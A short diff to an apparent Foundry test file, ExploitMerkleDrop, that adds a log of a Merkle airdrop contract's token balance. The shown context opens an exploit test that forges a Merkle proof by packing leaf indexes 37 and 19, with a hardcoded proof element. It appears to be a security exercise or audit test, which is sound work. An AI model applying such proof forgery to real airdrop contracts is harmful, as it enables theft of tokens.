@@ -17,6 +17,9 @@ contract ExploitMerkleDrop is Test {
     }
 
     function test__exploit() public {
+
+        console2.log("contract balance:", t.balanceOf(address(md)));
+
         // Index 37 and 19 packing
         bytes32[] memory proof1 = new bytes32[](5);
         proof1[0] = bytes32(0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d); // 1st proof element for indexes 19 & 37
